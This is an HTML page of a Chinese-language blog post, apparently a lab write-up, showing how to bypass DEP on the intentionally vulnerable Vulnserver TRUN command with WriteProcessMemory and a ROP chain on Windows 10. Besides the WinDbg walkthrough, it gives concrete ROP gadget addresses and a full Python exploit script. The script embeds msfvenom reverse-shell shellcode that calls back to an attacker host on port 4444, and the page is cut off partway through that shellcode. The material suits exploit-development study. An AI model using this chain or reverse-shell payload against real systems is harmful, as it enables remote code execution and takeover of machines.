@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"n0maj1o24.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="这次，用WriteProcessMemory来Bypass DEP，看一下WriteProcessMemory的函数原型： 1234567BOOL WriteProcessMemory(  [in]  HANDLE  hProcess,  [in]  LPVOID  lpBaseAddress,  [in]  LPCVOID lpBuffer,  [in]  SIZE_T  nSize,  [ou">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnserver TRUN Bypass DEP With ROP On Win10 II">
+<meta property="og:url" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/index.html">
+<meta property="og:site_name" content="Technical Memorandum">
+<meta property="og:description" content="这次，用WriteProcessMemory来Bypass DEP，看一下WriteProcessMemory的函数原型： 1234567BOOL WriteProcessMemory(  [in]  HANDLE  hProcess,  [in]  LPVOID  lpBaseAddress,  [in]  LPCVOID lpBuffer,  [in]  SIZE_T  nSize,  [ou">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/01.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/02.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/03.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/04.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/05.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/06.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/07.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/08.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/09.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/10.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/11.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/12.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/13.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/14.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/15.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/16.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/17.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/18.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/19.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/20.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/21.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/21.png">
+<meta property="article:published_time" content="2022-05-30T10:56:22.000Z">
+<meta property="article:modified_time" content="2022-05-30T03:09:51.278Z">
+<meta property="article:author" content="n0maj1o24">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="Stack Based Overflows">
+<meta property="article:tag" content="DEP">
+<meta property="article:tag" content="ROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/01.png">
+
+<link rel="canonical" href="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Vulnserver TRUN Bypass DEP With ROP On Win10 II | Technical Memorandum</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Technical Memorandum</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="n0maj1o24">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Technical Memorandum">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vulnserver TRUN Bypass DEP With ROP On Win10 II
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-30 10:56:22 / 修改时间：03:09:51" itemprop="dateCreated datePublished" datetime="2022-05-30T10:56:22Z">2022-05-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows-Exploitation/" itemprop="url" rel="index"><span itemprop="name">Windows Exploitation</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这次，用<code>WriteProcessMemory</code>来<code>Bypass DEP</code>，看一下<code>WriteProcessMemory</code>的函数原型：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  LPVOID  lpBaseAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in]  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  [out] SIZE_T  *lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>hProcess：</code>要修改的进程内存的句柄。句柄必须具有对进程的 <code>PROCESS_VM_WRITE</code> 和 <code>PROCESS_VM_OPERATION</code> 访问权限。</p>
+<p><code>lpBaseAddress：</code>指向要写入数据的指定进程中的基地址的指针。在数据传输发生之前，系统会验证指定大小的基地址和内存中的所有数据都可以进行写访问，如果不可访问，则函数失败。</p>
+<p><code>lpBuffer：</code>指向缓冲区的指针，该缓冲区包含要写入指定进程地址空间的数据。</p>
+<p><code>nSize：</code>要写入指定进程的字节数。</p>
+<p><code>lpNumberOfBytesWritten：</code>指向变量的指针，该变量接收传输到指定进程的字节数。此参数是可选的。如果 <code>lpNumberOfBytesWritten</code> 为<code>NULL</code>，则忽略该参数。</p>
+<p>根据函数各参数的说明，在<code>Bypass DEP</code>的时候，各参数的设置情况：</p>
+<p><code>hProcess：</code>提供一个伪句柄，指定为特定的常量<code>-1</code>，当<code>WriteProcessMemory API</code>被调用的时候，它会将<code>-1</code>转换为实际进程句柄，也就意味着这个参数我们设置的时候可以忽略。</p>
+<p><code>lpBaseAddress：</code>这个参数我们可以设置为一个绝对地址，其指向我们将要写入模块的代码段，为了不引起程序崩溃，可以指向代码段中未使用的区域。这里有个技巧，因为代码段在编译的时候需要对齐，所以选择在代码段上限的尾部即可，因为这里填充的一定是<code>null</code>字符。</p>
+<p>在<code>windbg</code>中看一眼：</p>
+<p>这里可以使用的是<code>essfunc.dll</code>。</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/01.png" alt="BOF"></p>
+<p>依据<code>PE</code>相关知识，获取代码段地址的步骤：</p>
+<p><code>DOS Header + 0x3c</code>指向<code>PE Header</code>：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/02.png" alt="BOF"></p>
+<p><code>PE Header + 0x2c</code>指向代码段：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/03.png" alt="BOF"></p>
+<p>来获取<code>essfunc.dll</code>的代码段地址：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/04.png" alt="BOF"></p>
+<p>获取的代码段地址为<code>62501000</code>，看一下对应的内存属性：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/05.png" alt="BOF"></p>
+<p>定位到代码段某一地址（这里<code>62501c00</code> ，后续考虑地址不包含<code>00</code>字符，选择<code>62501c10</code>作为<code>lpBaseAddress</code>的值）：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/06.png" alt="BOF"></p>
+<p><code>lpBuffer：</code>保存<code>shellcode</code>所在地址，这个地址需要到执行栈溢出之后，才能确定。</p>
+<p><code>nSize：shellcode</code>的大小。几乎所以<code>metasploit</code>产生的<code>shellcode</code>大小都是小于<code>500bytes</code>，所以我们可以指定任意值，这里用<code>-524（0xfffffdf4）</code>代替，然后取反即可。换做<code>ROP Gadget</code>就是先把<code>0xfffffdf4</code>存入某个寄存器，如<code>EAX</code>，然后<code>NEG EAX</code>即可。</p>
+<p><code>lpNumberOfBytesWritten：</code>指向一个可写的<code>DWORD</code>空间，用于保存<code>WriteProcessMemory</code>复制的<code>byte</code>数目。比较简单的方法是将其保存到<code>essfunc.dll</code>的数据段里面，来看一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0:001&gt; !dh -a essfunc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/07.png" alt="BOF"></p>
+<p>确认数据段里面的空间没有被使用：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/08.png" alt="BOF"></p>
+<p>段需要对齐，可以查看<code>section alignment</code>的对齐为<code>1000</code>：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/09.png" alt="BOF"></p>
+<p>前面<code>2000+24</code>的值不为<code>1000</code>的整数倍，所以后续会补<code>00</code>，直到它为<code>1000</code>的整数倍为止。我们在取值的时候<code>+4</code>正好可以落在为了补齐增加的<code>00</code>空间里，不需要刻意到前面去查找。</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/10.png" alt="BOF"></p>
+<p>接下来，就是在<code>essfunc.dll</code>的<code>IAT</code>中找是否存在<code>WriteProcessMemory</code>，利用<code>!dh essfunc.dll -f</code>查看<code>IAT</code>地址和偏移时发现都是空，有点诡异。</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/11.png" alt="BOF"></p>
+<p>在<code>windbg</code>用命令<code>dps essfunc  L2000</code>查看，找到一些信息：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/12.png" alt="BOF"></p>
+<p>借用之前文章<a href="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/">《Sync Breeze 10.0.28 bypass DEP》</a>的方法获取<code>WriteProcessMemory</code>的地址，这里就不过多介绍了，国际友人那个脚本会出问题，还是得手动来：</p>
+<p><img src="/2022/05/30/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10-II/13.png" alt="BOF"></p>
+<p>根据以上信息，<code>WriteProcessMemory</code>函数的部分参数是可以提前确定的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func  = struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x45454545</span>)     <span class="comment"># WriteProcessMemory Address</span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62501c10</span>)     <span class="comment"># Shellcode Return Address</span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0xFFFFFFFF</span>)     <span class="comment"># pseudo Process handle</span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62501c10</span>)     <span class="comment"># Code cave address</span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x41414141</span>)     <span class="comment"># dummy lpBuffer (Stack address) </span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x41414141</span>)     <span class="comment"># dummy nSize</span></span><br><span class="line">func += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x62502028</span>)     <span class="comment"># lpNumberOfBytesWritten</span></span><br></pre></td></tr></table></figure>
+
+<p>现在需要关注的仅为WriteProcessMemory函数地址，shellcode在栈空间的地址，以及shellcode的大小。</p>
+<p>这里在确定shellcode栈空间的时候，主动腾出了一片栈空间，保重ROP Gadget不会超出这块空间，也就确定了shellcode的地址，因为只需要接在这块空间之后即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">rop1  = struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x755912d6</span>)    <span class="comment"># PUSH ESP # POP ESI # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x755b671f</span>)    <span class="comment"># MOV EDX,ESI # POP ESI # RETN 0x04    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x7728bdf4</span>)    <span class="comment"># MOV EAX,EDX # POP ESI # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x41414141</span>)    <span class="comment"># junk</span></span><br><span class="line"></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x88888888</span>)    <span class="comment"># 0x88888888</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758cc157</span>)    <span class="comment"># POP ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x77777878</span>)    <span class="comment"># 0x77777878</span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x75515163</span>)    <span class="comment"># ADD EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772a9052</span>)    <span class="comment"># XCHG EAX,ECX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x758fe636</span>)    <span class="comment"># MOV EAX,EDX # RETN  </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x772f4302</span>)    <span class="comment"># SUB EAX,16 # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f4480</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x749f4480</span>)    <span class="comment"># INC EAX # RETN    </span></span><br><span class="line">rop1 += struct.pack(<span class="string">"&lt;L"</span>, <span class="number">0x754e2d6d</span>)    <span class="comment"># MOV DWORD PTR [EAX],ECX # RETN</span></span><br></pre></td></tr></table></figure>
+
+<p>完整的利用代码如下：（系统重启无效，因为很多<code>ROP Gadgets</code>源于开启<code>ASLR</code>的<code>DLL</code>，<code>ESSFUNC.DLL</code>中不具备完全的<code>ROP Chain</code>生成要素）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Vulnserver TRUN exploit (ROP, DEP bypass).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Vulnerable Software: Vulnserver</span></span><br><span class="line"><span class="string">Version: 1.00</span></span><br><span class="line"><span class="string">Exploit Author: Andres Roldan</span></span><br><span class="line"><span class="string">Tested On: Windows 10 20H2</span></span><br><span class="line"><span class="string">Writeup: https://fluidattacks.com/blog/vulnserver-trun-rop/</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'192.168.91.142'</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.13.137 LPORT=4444 EXITFUNC=thread -f python -v shellcode -b '\x00'</span></span><br><span class="line">shellcode =  <span class="string">b""</span></span><br><span class="line">shellcode += <span class="string">b"\xbd\x77\x28\x83\xaa\xdb\xd9\xd9\x74\x24\xf4"</span></span><br><span class="line">shellcode += <span class="string">b"\x58\x31\xc9\xb1\x52\x31\x68\x12\x03\x68\x12"</span></span><br><span class="line">shellcode += <span class="string">b"\x83\x9f\xd4\x61\x5f\xa3\xcd\xe4\xa0\x5b\x0e"</span></span><br><span class="line">shellcode += <span class="string">b"\x89\x29\xbe\x3f\x89\x4e\xcb\x10\x39\x04\x99"</span></span><br><span class="line">shellcode += <span class="string">b"\x9c\xb2\x48\x09\x16\xb6\x44\x3e\x9f\x7d\xb3"</span></span><br><span class="line">shellcode += <span class="string">b"\x71\x20\x2d\x87\x10\xa2\x2c\xd4\xf2\x9b\xfe"</span></span><br><span class="line">shellcode += <span class="string">b"\x29\xf3\xdc\xe3\xc0\xa1\xb5\x68\x76\x55\xb1"</span></span><br><span class="line">shellcode += <span class="string">b"\x25\x4b\xde\x89\xa8\xcb\x03\x59\xca\xfa\x92"</span></span><br><span class="line">shellcode += <span class="string">b"\xd1\x95\xdc\x15\x35\xae\x54\x0d\x5a\x8b\x2f"</span></span><br><span class="line">shellcode += <span class="string">b"\xa6\xa8\x67\xae\x6e\xe1\x88\x1d\x4f\xcd\x7a"</span></span><br><span class="line">shellcode += <span class="string">b"\x5f\x88\xea\x64\x2a\xe0\x08\x18\x2d\x37\x72"</span></span><br><span class="line">shellcode += <span class="string">b"\xc6\xb8\xa3\xd4\x8d\x1b\x0f\xe4\x42\xfd\xc4"</span></span><br><span class="line">shellcode += <span class="string">b"\xea\x2f\x89\x82\xee\xae\x5e\xb9\x0b\x3a\x61"</span></span><br><span class="line">shellcode += <span 